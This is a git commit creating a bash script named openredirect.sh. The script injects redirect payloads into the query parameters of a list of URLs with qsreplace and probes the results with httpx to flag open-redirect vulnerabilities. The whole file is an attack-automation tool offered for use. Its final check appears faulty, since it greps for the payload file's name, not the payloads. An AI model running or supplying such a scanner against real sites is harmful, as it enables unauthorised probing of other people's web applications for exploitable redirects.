240c9a9a89985c85092c6148b221d0095a03132e
AshiqurEmon <45551479+AshiqurEmon@users.noreply.github.com>
2023-03-17 15:54:05 +0600

    Create openredirect.sh

---
+++ openredirect.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+domain=$1
+
+url=$2
+
+cat $url |while read d;do cat $1|grep '='| qsreplace $d|python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));"|grep $d|anew|tee -a urls.txt;done
+
+cat $url |while read d;do cat $1|grep '='| qsreplace $d|anew|tee -a urls.txt;done
+
+cat urls.txt | httpx -location|grep $2 | tee -a redirect_vul_url.txt
